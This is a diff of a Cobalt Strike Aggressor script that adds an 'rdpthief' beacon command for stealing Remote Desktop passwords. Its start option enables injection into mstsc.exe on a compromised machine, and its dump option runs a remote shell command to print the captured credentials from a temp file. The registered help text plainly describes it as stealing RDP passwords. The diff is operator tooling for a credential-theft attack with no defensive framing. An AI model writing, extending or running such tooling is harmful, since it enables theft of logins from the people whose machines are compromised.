@@ -35,19 +35,26 @@ sub handleProcess{
 
 #append menus
 
+alias rdpthief{
+	if ($2 eq "start"){
+		blog($1, "RdpThief enabled \n");
+        add(@beacons,$1,0);
+	}
+	else if ($2 eq "stop"){
+		blog($1, "Disabling RdpThief");
+        remove(@beacons,$1);
+	}
+	else if ($2 eq "dump"){
+		blog($1, "Dumping RdpThief");
+		bshell($1,"type %temp%\\data.bin");
+	}
+	else{
+		blog($1, "Invaild args ! Only support start,stop,dump");
+	}
 
-    menu "RdpThief"{
-        item "Rdpthief_Enable"{
-            blog($1, "RdpThief enabled \n");
-            add(@beacons,$1,0);
-        }
+}
 
-        item "Rdpthief_Disable"{
-            blog($1, "Disabling RdpThief");
-            remove(@beacons,$1);
-        }
-
-        item "Rdpthief_Dump"{
-            bshell($1,"type %temp%\\data.bin");
-        }
-    }
+beacon_command_register(
+	"rdpthief", 
+	"steal rdp password", 
+	"Start: inject mstsc.exe process.\nStop: stop capture.\nDump: view capture data");
